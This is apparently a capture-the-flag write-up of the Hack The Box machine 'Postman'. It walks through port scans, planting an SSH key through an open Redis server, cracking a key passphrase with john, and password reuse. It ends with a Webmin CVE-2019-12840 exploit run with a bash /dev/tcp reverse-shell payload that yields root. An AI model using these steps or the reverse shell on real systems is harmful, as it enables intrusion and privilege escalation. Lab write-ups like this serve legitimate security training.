@@ -1,0 +1,232 @@
+#Postman
+
+Let's scan this box 
+
+kali@kali:~/HackMex/cupid$ sudo nmap -vv -Pn -n -sS 10.10.10.160
+[sudo] password for kali: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-31 00:23 EDT
+Initiating SYN Stealth Scan at 00:23
+Scanning 10.10.10.160 [1000 ports]
+Discovered open port 22/tcp on 10.10.10.160
+Discovered open port 80/tcp on 10.10.10.160
+Discovered open port 10000/tcp on 10.10.10.160
+Increasing send delay for 10.10.10.160 from 0 to 5 due to 166 out of 553 dropped probes since last increase.
+Completed SYN Stealth Scan at 00:23, 14.97s elapsed (1000 total ports)
+Nmap scan report for 10.10.10.160
+Host is up, received user-set (0.11s latency).
+Scanned at 2020-10-31 00:23:16 EDT for 15s
+Not shown: 997 closed ports
+Reason: 997 resets
+PORT      STATE SERVICE          REASON
+22/tcp    open  ssh              syn-ack ttl 63
+80/tcp    open  http             syn-ack ttl 63
+10000/tcp open  snet-sensor-mgmt syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 15.04 seconds
+           Raw packets sent: 1623 (71.412KB) | Rcvd: 1008 (40.332KB)
+
+Personal note, always try to use -p- with nmap. It will make life way easier because nmap scans only the first 1000 ports by default, and sometimes, services like to use ports bigger than 1000.
+
+kali@kali:~/HackMex/cupid$ nmap -p- --open -T5 -v -n 10.10.10.160 -oG all-ports
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-31 01:18 EDT
+Failed to resolve "postman.htb".
+Read data files from: /usr/bin/../share/nmap
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.13 seconds
+kali@kali:~/HackMex/cupid$ nmap -p- --open -T5 -v -n 10.10.10.160 -oG all-ports
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-31 01:18 EDT
+Initiating Ping Scan at 01:18
+Scanning 10.10.10.160 [2 ports]
+Completed Ping Scan at 01:18, 0.11s elapsed (1 total hosts)
+Initiating Connect Scan at 01:18
+Scanning 10.10.10.160 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.160
+Discovered open port 22/tcp on 10.10.10.160
+Discovered open port 10000/tcp on 10.10.10.160
+Connect Scan Timing: About 47.77% done; ETC: 01:19 (0:00:34 remaining)
+Discovered open port 6379/tcp on 10.10.10.160
+Completed Connect Scan at 01:19, 64.78s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.160
+Host is up (0.12s latency).
+Not shown: 44353 closed ports, 21178 filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+6379/tcp  open  redis
+10000/tcp open  snet-sensor-mgmt
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 64.94 seconds
+
+We can exploit redis by leveraging the redis cli
+
+
+
+
+We generate a pair of ssh keys:
+
+ali@kali:~/CTF/HTB/Machines/Postman$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/CTF/HTB/Machines/Postman/id_rsa
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/kali/CTF/HTB/Machines/Postman/id_rsa
+Your public key has been saved in /home/kali/CTF/HTB/Machines/Postman/id_rsa.pub
+The key fingerprint is:
+SHA256:oX3cdyGZp+BEYVls1RxGlnF0U8GNRKXneh28/M12zXc kali@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|           +=+*##|
+|          o. o*+B|
+|        .  o.+.o.|
+|       o oo.. =o.|
+|      . S o....oo|
+|         .   ..o+|
+|              .++|
+|               oE|
+|               .B|
++----[SHA256]-----+
+
+
+We transfer the keys to the redis database using redis-cli
+
+kali@kali:~/CTF/HTB/Machines/Postman$ cat foo.txt | redis-cli -h 10.10.10.160 -x set htb
+OK
+
+we connect to the reddis server and create a directory for authorized keys in order to connect
+
+kali@kali:~/HackMex/cupid$ redis-cli -h 10.10.10.160
+
+10.10.10.160:6379> config set dir /var/lib/redis/
+OK
+10.10.10.160:6379> config set dir /var/lib/redis/.ssh
+OK
+10.10.10.160:6379> config set dbfilename authorized_keys
+OK
+10.10.10.160:6379> save
+OK
+10.10.10.160:6379> 
+
+
+We set proper permissions on our private key before connecting 
+
+	chmod 400 id_rsa
+
+
+And we connect to the server
+
+	kali@kali:~/CTF/HTB/Machines/Postman$ ssh -i id_rsa redis@10.10.10.160
+	Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+	 * Documentation:  https://help.ubuntu.com
+	 * Management:     https://landscape.canonical.com
+	 * Support:        https://ubuntu.com/advantage
+
+
+	 * Canonical Livepatch is available for installation.
+	   - Reduce system reboots and improve kernel security. Activate at:
+	     https://ubuntu.com/livepatch
+	Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+	Last login: Sat Oct 31 05:56:15 2020 from 10.10.14.3
+	redis@Postman:~$ 
+
+If we use linpeas we will find a private ssh key on /opt/. The file belongs to Matt, if we can create a public key from the private key we may be able to connect as him! 
+The file is password protected, though. We need to crack it using john the ripper. 
+
+redis@Postman:/opt$ ls -la
+total 12
+drwxr-xr-x  2 root root 4096 Sep 11  2019 .
+drwxr-xr-x 22 root root 4096 Sep 30 16:14 ..
+-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
+
+
+Let's copy the contents of the file to our local machine on a file called priv_key, and use ssh2john on it.
+
+kali@kali:~/CTF/HTB/Machines/Postman$ python /usr/share/john/ssh2john.py priv_key > john_key
+priv_key:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63
+
+Cool. Now we can use john on the john compatible key and see if we can crack it using rockyou.
+
+kali@kali:~/CTF/HTB/Machines/Postman$ sudo john john_key -wordlist:/home/kali/tools/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+computer2008     (priv_key)
+1g 0:00:00:10 DONE (2020-10-31 02:16) 0.09115g/s 1307Kp/s 1307Kc/s 1307KC/sa6_123..*7¡Vamos!
+Session completed
+kali@kali:~/CTF/HTB/Machines/Postman$ 
+
+That did it! Our password is computer2008. Now let's generate a new public key and connect.
+
+redis@Postman:/opt$  ssh-keygen -y -f id_rsa.bak > /tmp/id_rsa.pub
+Enter passphrase: computer2008
+redis@Postman:/opt$ cd /tmp/
+redis@Postman:/tmp$ ls
+id_rsa.pub
+index.html
+linpeas.sh
+systemd-private-ba479cad1790460d8d14c799511f6eda-apache2.service-yt1G93
+systemd-private-ba479cad1790460d8d14c799511f6eda-redis-server.service-MeVID3
+systemd-private-ba479cad1790460d8d14c799511f6eda-systemd-resolved.service-6eQc3m
+systemd-private-ba479cad1790460d8d14c799511f6eda-systemd-timesyncd.service-MMErnA
+vmware-root_338-566990476
+redis@Postman:/tmp$ 
+
+kali@kali:~/CTF/HTB/Machines/Postman$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9G3YmCM+3do9kxHxl8h9NvQezbFAa74QUKmPJooFczrWldO6eWiBhw/4bAtThIMfjQ1pKh5wNE/ski2TYG7+cFHHMixuBGHNsIfOjZT8xJ4DSnfVsCt1GF/ubZ5J3h683RfrF8A1RHCohi42GWg304EfsEkH/DQlJiIz5ZIDVmpalcpFKCTUErkuSSANAsXTTnUZx5Pq6x1fKM/MiGnsZOSrRXCxKAH/hQV1XIwcjj58FbDI3AW+1kczJeDNTlPnMlf4U8Wl3xnqZhN/DYjwlaZu8W8xWLO9I9InUNPu6eeKxoJc5+WaNh5R7Aag05djtokG/uCltdBYYDgumYqAX
+> " > id_rsa2.pub
+kali@kali:~/CTF/HTB/Machines/Postman$ ssh -i id_rsa2.pub Matt@10.10.10.160
+Matt@10.10.10.160's password: 
+Permission denied, please try again.
+
+That did not work. Let's hope Matt has bad security practices and reuses passwords.
+
+redis@Postman:/opt$ su Matt
+Password: 
+Matt@Postman:/opt$ 
+
+Ah, yes. He does. We can find the user flag on his home folder. I looked around for services to privesc but couldn't find much. Going back to the services we found earlier we had a Webmin service running on port 10000. We might be able to exploit that.
+
+If we access 10.10.10.160 on port 10000 we will find a login page, where we can login as Matt because Matt is a bad user who reuses passwords. When logging in as Matt we can't do much but we can see that the webmin version is 1.910. There could be a CVE that has been published. Apparently, this CVE is CVE-2019-12840
+
+https://www.exploit-db.com/exploits/46984
+
+The CVE is a vulnerability which can allow any user which has access to the Software Package Updates to execute commands with root privileges. An exploit is available at https://github.com/bkaraceylan/CVE-2019-12840_POC.
+
+kali@kali:~/CTF/HTB/Machines/Postman$ python3 exploit.py -u https://10.10.10.160 -p 10000 -U Matt -P computer2008 -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'
+
+We catch the outgoing connection with netcat.
+
+kali@kali:~/HackMex/cupid$ nc -lvnp 4444
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.10.160.
+Ncat: Connection from 10.10.10.160:59542.
+bash: cannot set terminal process group (758): Inappropriate ioctl for device
+bash: no job control in this shell
+
+root@Postman:/usr/share/webmin/package-updates/# 
+
+root@Postman:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@Postman:~# 
+
+
+
+
+
+
+
+
+
+
+
